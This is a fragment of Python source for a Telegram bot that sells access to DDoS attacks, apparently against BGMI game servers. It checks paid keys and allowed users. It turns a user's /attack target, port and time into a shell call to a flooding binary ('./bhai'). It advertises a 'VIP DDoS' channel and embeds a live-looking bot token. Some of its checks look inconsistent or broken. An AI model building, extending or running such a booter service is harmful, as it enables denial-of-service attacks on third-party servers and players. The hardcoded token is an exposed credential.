...
bot = telebot.TeleBot('7296070635:AAHsnVKJOcDbsKkFSo1DWvXMLbhHUE1PWL4')
...
def authorize_user(message, func):
    ...
    if is_key_valid(message.text):
        ...
        bot.reply_to(message, "🚫KEY EXPIRED OR INVALID❌ GET NEW KEY 🔑 @buggi_2✅.")    
    ...
    if user_id in allowed_user_ids:
        ...
        if user_id not in admin_id:
            ...
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown ❌. Please Wait 0min Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
        ...
        if len(command) == 4:  # Updated to accept target, time, and port
            ...
            if time > 181:
                ...
                full_command = f"./bhai {target} {port} {time} 12 1800"
...
➡️ TO Start 𝐁 𝐔 𝐆 𝐆 𝐈  Ddos Attack  : /attack 
...
Official Channel :- https://t.me/buggivipddos
'''
...
➡️ Join Telegram :- https://t.me/buggivipddos'''
...
def set_bot_commands():
    ...
    BotCommand("id", "Get User ID"),
        ...
        BotCommand("bgmi", "START 𝐁 𝐔 𝐆 𝐆 𝐈 DDOS ATTACK"),
...
def create_user_keyboard():
    ...
    button1 = KeyboardButton("♻️ START 𝐁 𝐔 𝐆 𝐆 𝐈  DDOS ATTACK ♻️")
...
@bot.message_handler(func=lambda message: message.text in ["♻️ START 𝐁 𝐔 𝐆 𝐆 𝐈  DDOS ATTACK ♻️", "RULES ℹ️", "MY LOGS 📝", "HELP ❓", "BUY PLAN 🛒"])
def handle_user_buttons(message):
    user_id = str(message.chat.id)
    
    if user_id in allowed_user_ids:
        if message.text == "♻️ START 𝐁 𝐔 𝐆 𝐆 𝐈  DDOS ATTACK ♻️":
            handle_bgmi(message)
...
@bot.message_handler(func=lambda message: message.text in ["♻️ START 𝐁 𝐔 𝐆 𝐆 𝐈  DDOS ATTACK ♻️", "LOGS 📊", "ALL USERS 👥", "CLEAR LOGS 🗑️"])
